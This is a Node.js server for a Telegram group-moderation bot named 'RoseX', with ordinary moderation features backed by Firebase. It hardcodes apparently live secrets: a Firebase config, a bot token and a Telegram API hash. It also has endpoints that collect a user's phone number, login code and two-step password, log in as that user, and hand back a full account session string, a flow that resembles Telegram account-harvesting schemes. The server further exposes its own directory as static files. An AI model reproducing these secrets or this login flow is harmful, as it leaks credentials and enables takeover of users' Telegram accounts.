const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { computeCheck } = require('telegram/Password');
const path = require('path');
const fs = require('fs');

// Firebase Node Client Setup
const firebase = require('firebase/compat/app');
require('firebase/compat/database');

const firebaseConfig = {
    apiKey: "AIzaSyBkL3ObqERCiDBuyXz4lr3Y7PYxzxt4hqA",
    authDomain: "vsprotection1.firebaseapp.com",
    databaseURL: "https://vsprotection1-default-rtdb.firebaseio.com",
    projectId: "vsprotection1",
    storageBucket: "vsprotection1.firebasestorage.app",
    messagingSenderId: "635122514754",
    appId: "1:635122514754:web:893417281989495d9066db"
};

if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}
const db = firebase.database();

// Environment & Keys
const BOT_TOKEN = process.env.BOT_TOKEN || "8590481969:AAFezVtaNE6D0QF0ss26k2SHj5tW7hCiSN8";
const API_ID = parseInt(process.env.API_ID || "39447470");
const API_HASH = process.env.API_HASH || "eb7cac1c8ad9935d4b208dc0da076d8c";
const PORT = process.env.PORT || 3000;

const app = express();
app.use(cors());
app.use(express.json());

// Serve Static Assets
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(__dirname));

// Keep-Alive Ping for Cron Jobs
app.get('/ping', (req, res) => res.status(200).send("OK - RoseX Cloud Engine Active"));

// =============================================================================
// TELEGRAF MODERATION & SECURITY BOT ENGINE
// =============================================================================
const bot = new Telegraf(BOT_TOKEN);
let chatSettingsCache = {};
let botUsername = "";

// Resolve Bot Profile
bot.telegram.getMe().then(info => {
    botUsername = info.username;
    console.log(`[RoseX] Bot Online: @${botUsername}`);
}).catch(err => {
    console.error("[RoseX] Bot Token Verification Failed:", err.message);
});

// Cache Sync
async function getChatSettings(chatId) {
    if (chatSettingsCache[chatId]) return chatSettingsCache[chatId];
    try {
        const snap = await db.ref(`groups/${chatId}/settings`).once('value');
        const settings = snap.val() || {
            welcome: { enabled: true, text: "Welcome {user} to {chat}!" },
            antiLink: { enabled: false },
            antiForward: { enabled: false },
            badWords: { enabled: false, words: [], action: 'delete' },
            warnLimit: 3,
            chatLocked: false
        };
        chatSettingsCache[chatId] = settings;
        return settings;
    } catch (e) {
        return {};
    }
}

db.ref('groups').on('child_changed', (snap) => {
    const val = snap.val();
    if (val && val.settings) chatSettingsCache[snap.key] = val.settings;
});

// Welcome New Members
bot.on('new_chat_members', async (ctx) => {
    try {
        const chatId = ctx.chat.id;
        const settings = await getChatSettings(chatId);
        if (!settings.welcome?.enabled) return;

        for (const member of ctx.message.new_chat_members) {
            if (member.is_bot) continue;
            const msg = (settings.welcome.text || "Welcome {user} to {chat}!")
                .replace(/{user}/g, member.first_name || "Member")
                .replace(/{chat}/g, ctx.chat.title || "Community");
            ctx.reply(msg).catch(() => {});
        }
    } catch (err) {}
});

// Moderation Middleware
bot.on('message', async (ctx, next) => {
    try {
        if (!ctx.chat || ctx.chat.type === 'private') return next();

        const chatId = ctx.chat.id;
        const userId = ctx.from?.id;
        const text = ctx.message.text || ctx.message.caption || "";
        const settings = await getChatSettings(chatId);

        // Bypass for Group Administrators & Creator
        try {
            const member = await ctx.getChatMember(userId);
            if (['creator', 'administrator'].includes(member.status)) return next();
        } catch (e) {
            return next();
        }

        // 1. Chat Lock Enforcement
        if (settings.chatLocked) {
            await ctx.deleteMessage().catch(() => {});
            return;
        }

        // 2. Anti-Forward Enforcement
        if (settings.antiForward?.enabled && (ctx.message.forward_date || ctx.message.forward_origin)) {
            await ctx.deleteMessage().catch(() => {});
            return;
        }

        // 3. Anti-Link Enforcement
        if (settings.antiLink?.enabled) {
            const linkRegex = /(https?:\/\/[^\s]+)|(t\.me\/[^\s]+)|(telegram\.me\/[^\s]+)/gi;
            if (linkRegex.test(text)) {
                await ctx.deleteMessage().catch(() => {});
                return;
            }
        }

        // 4. Bad Words / Profanity Blacklist Enforcement
        if (settings.badWords?.enabled && Array.isArray(settings.badWords.words)) {
            const foundBadWord = settings.badWords.words.some(word => 
                word.trim() && text.toLowerCase().includes(word.trim().toLowerCase())
            );

            if (foundBadWord) {
                await ctx.deleteMessage().catch(() => {});
                const action = settings.badWords.action || 'delete';

                if (action === 'warn') {
                    const warnRef = db.ref(`groups/${chatId}/warns/${userId}`);
                    const snap = await warnRef.once('value');
                    const warns = (snap.val() || 0) + 1;
                    await warnRef.set(warns);

                    if (warns >= (settings.warnLimit || 3)) {
                        await ctx.banChatMember(userId).catch(() => {});
                        await warnRef.remove();
                        ctx.reply(`🚨 User @${ctx.from.username || ctx.from.first_name} has been banned for exceeding warning limits.`);
                    } else {
                        ctx.reply(`⚠️ Warning [${ctx.from.first_name}]! Profanity prohibited. (${warns}/${settings.warnLimit || 3})`);
                    }
                } else if (action === 'ban') {
                    await ctx.banChatMember(userId).catch(() => {});
                    ctx.reply(`⛔ User @${ctx.from.username || ctx.from.first_name} has been banned for policy violation.`);
                }
                return;
            }
        }
    } catch (e) {}
    return next();
});

// =============================================================================
// GRAMJS MTPROTO API (SESSION MANAGEMENT & AUTO BOT SETUP)
// =============================================================================
const tempAuthClients = {};

// Step 1: Send Telegram OTP
app.post('/api/tg/send-code', async (req, res) => {
    const { phone } = req.body;
    try {
        const client = new TelegramClient(new StringSession(""), API_ID, API_HASH, { connectionRetries: 5 });
        await client.connect();
        const sendCodeResult = await client.sendCode({ apiId: API_ID, apiHash: API_HASH }, phone);
        tempAuthClients[phone] = { client, phoneCodeHash: sendCodeResult.phoneCodeHash };
        res.json({ success: true, phoneCodeHash: sendCodeResult.phoneCodeHash });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Step 2: Verify Code (Direct MTProto RPC Call)
app.post('/api/tg/verify-code', async (req, res) => {
    const { phone, code, phoneCodeHash, password } = req.body;
    try {
        const sessionData = tempAuthClients[phone];
        if (!sessionData) {
            throw new Error("Session expired. Please click 'Send Code' again.");
        }

        const client = sessionData.client;
        if (!client.connected) await client.connect();

        try {
            // Direct RPC Call to bypass client.signInUser callback bugs
            await client.invoke(new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCodeHash: phoneCodeHash || sessionData.phoneCodeHash,
                phoneCode: code.toString().trim()
            }));
        } catch (authErr) {
            // Handle Two-Step Cloud Verification Password (2FA)
            if (authErr.message.includes('SESSION_PASSWORD_NEEDED')) {
                if (!password) {
                    return res.json({ success: false, needPassword: true, message: "Two-step verification password required." });
                }
                const pwd = await client.invoke(new Api.account.GetPassword());
                const passwordCheck = await computeCheck(pwd, password);
                await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
            } else {
                throw authErr;
            }
        }

        const stringSession = client.session.save();
        const dialogs = await client.getDialogs({ limit: 100 });
        
        // Extract Groups/Channels
        const adminGroups = [];
        for (const d of dialogs) {
            if (d.isGroup || d.isChannel) {
                adminGroups.push({
                    id: d.id.toString(),
                    title: d.title || "Community",
                    membersCount: d.entity?.participantsCount || 0
                });
            }
        }

        delete tempAuthClients[phone];
        res.json({ success: true, session: stringSession, groups: adminGroups });
    } catch (e) {
        res.status(500).json({ error: e.message || "Invalid Telegram OTP code." });
    }
});

// Step 3: Automatically Add Bot & Grant Full Admin Privileges
app.post('/api/tg/connect-group', async (req, res) => {
    const { session, chatId } = req.body;
    try {
        const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, {});
        await client.connect();

        const targetBot = botUsername || BOT_TOKEN.split(':')[0];
        const botEntity = await client.getEntity(targetBot);
        
        await client.invoke(new Api.channels.EditAdmin({
            channel: chatId,
            userId: botEntity,
            adminRights: new Api.ChatAdminRights({
                changeInfo: true,
                postMessages: true,
                editMessages: true,
                deleteMessages: true,
                banUsers: true,
                inviteUsers: true,
                pinMessages: true,
                addAdmins: false,
                manageCall: true
            }),
            rank: 'RoseX Guard'
        }));

        res.json({ success: true, message: "Bot promoted to Administrator with full privileges!" });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Single Page Application Fallback (Guaranteed File Route)
app.get('*', (req, res) => {
    const p1 = path.join(__dirname, 'public', 'index.html');
    const p2 = path.join(__dirname, 'index.html');
    if (fs.existsSync(p1)) return res.sendFile(p1);
    if (fs.existsSync(p2)) return res.sendFile(p2);
    res.status(404).send("<h2>index.html not found. Ensure it is placed in public/ or root directory.</h2>");
});

// Bind Server & Launch Bot
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[RoseX] HTTP Server running on port ${PORT}`);
    bot.launch()
        .then(() => console.log("[RoseX] Telegraf Engine Initialized."))
        .catch(e => console.error("[RoseX] Polling Error:", e.message));
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));